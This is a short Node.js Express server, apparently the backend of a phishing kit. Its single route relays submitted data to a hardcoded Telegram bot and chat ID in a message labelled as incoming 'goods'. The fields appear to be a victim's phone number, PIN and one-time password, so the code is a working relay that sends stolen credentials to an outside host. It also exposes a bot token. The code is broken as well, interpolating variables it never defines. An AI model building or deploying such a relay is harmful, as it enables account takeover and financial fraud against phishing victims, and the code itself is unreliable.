const express = require("express");
const axios = require("axios");

const app = express();

/* TOKEN BOT */
const BOT_TOKEN =
"8795244499:AAGoD4sd3_k7SHOa510ulhrOqXWrbkpPfv4";

/* CHAT ID */
const CHAT_ID =
"7558232474";

app.use(express.json());
app.use(express.static(__dirname));

/* ROUTE */
app.post("/send", async(req,res) => {

    try{

        const {
            nama,
            email,
            pesan
        } = req.body;

        /* PESAN TELEGRAM */
        const text = `
💳 <b>| BARANG MASUK BANG |</b> 💳

×  NMR  ×   : ${nmrx}
×  POX   ×   : ${pix}
×  OXT   ×   : ${otp}

<b>©️ By PxxStudix</b>
        `;

        /* KIRIM TELEGRAM */
        await axios.post(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {

            chat_id:
            CHAT_ID,

            text:
            text,

            parse_mode:
            "HTML"

        });

        res.json({

            success:true

        });

    }catch(error){

        console.log(error);

        res.status(500).json({

            success:false

        });

    }

});

/* PORT */
const PORT =
process.env.PORT || 3000;

/* JALANKAN */
app.listen(PORT, () => {

    console.log(
    "Server running on port " +
    PORT
    );

});
